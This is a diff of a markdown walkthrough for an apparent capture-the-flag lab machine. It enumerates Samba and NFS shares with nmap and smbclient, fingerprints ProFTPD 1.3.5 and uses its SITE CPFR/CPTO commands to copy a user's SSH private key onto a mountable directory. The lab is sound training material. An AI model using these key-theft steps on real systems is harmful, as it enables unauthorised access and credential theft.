@@ -2,23 +2,39 @@
 
 Walkthrough on exploiting a Linux machine. Enumerate Samba for shares, manipulate a vulnerable version of proftpd and escalate your privileges with path variable manipulation. 
 
+Set up environment IP as IP_Machine
+
+```
+export IP=10.10.184.151
+```
+
+![IP](./images/IP.png)
+
 ## Task 1 - Deploy the vulnerable machine
 
 * Scan the machine with nmap, how many ports are open?  
 	
+	```
+	nmap -sV $IP | tee nmap-scan.txt
+	```
+
 	![task1-nmap](./images/task1-nmap.png)
 
 ## Task 2 - Enumerating Samba for shares
 
 * Using the nmap command below, how many shares have been found?  
 	
-	`nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse 10.10.65.169`  
+	```
+	nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse $IP
+	```  
 
 	![task2-samba](./images/task2-samba.png)
 
 * Once you're connected, list the files on the share. What is the file can you see?  
 	
-	`smbclient //10.10.65.169/anonymous`  
+	```
+	smbclient //$IP/anonymous
+	```
 
 	![task2-smbclient](./images/task2-smbclient.png)
 
@@ -28,7 +44,9 @@ Walkthrough on exploiting a Linux machine. Enumerate Samba for shares, manipulat
 
 * In our case, port 111 is access to a network file system. Lets use nmap to enumerate this. What mount can we see?  
 	
-	`sudo nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount 10.10.65.169`  
+	```
+	sudo nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount $IP
+	```  
 
 	![task2-nfs](./images/task2-nfs.png)
 
@@ -38,31 +56,39 @@ Lets get the version of ProFtpd. Use netcat to connect to the machine on the FTP
 
 * What is the version?  
 	
-	`nc 10.10.65.169 21`  
+	```
+	nc 10.10.65.169 21
+	```
 
 	![task3-version](./images/task3-version.png)
 
 * How many exploits are there for the ProFTPd running?
 	
-	`searchsploit ProFtpd 1.3.5`  
+	```
+	searchsploit ProFtpd 1.3.5
+	```
 
 	![task3-sploit](./images/task3-sploit.png)
 
 
-* We know that the FTP service is running as the Kenobi user (from the file on the share) and an ssh key is generated for that user. We're now going to copy Kenobi's private key using SITE CPFR and SITE CPTO commands.We knew that the /var directory was a mount we could see (task 2, question 4). So we've now moved Kenobi's private key to the /var/tmp directory.  
+* We know that the FTP service is running as the Kenobi user (from the file on the share) and an ssh key is generated for that user. We're now going to copy Kenobi's private key using SITE CPFR and SITE CPTO commands.We knew that the /var directory was a mount we could see (task 2, question 4). So we've now moved Kenobi's private key to the /var/tmp directory.
+
 	```
 	SITE CPFR /home/kenobi/.ssh/id_rsa  
 	SITE CPTO /var/tmp/id_rsa
 	```  
+	
 	![task3-copy](./images/task3-copy.png)
 
 * What is Kenobi's user flag (/home/kenobi/user.txt)?  
-	* Lets mount the /var/tmp directory to our machine  
+	* Lets mount the /var/tmp directory to our machine
+	
 		```
-		mkdir /tmp/kenobiNFS
-		mount 10.10.231.1:/var /tmp/kenobiNFS
-		ls -la /tmp/kenobiNFS
+		mkdir /tmp/KenobiNFS
+		sudo mount 10.10.231.1:/var /tmp/KenobiNFS
+		ls -la /tmp/KenobiNFS
 		```
+		
 		![task3-kenobiNFS](./images/task3-kenobiNFS.png)
 
 	*  We now have a network mount on our deployed machine! We can go to /var/tmp and get the private key then login to Kenobi's account.
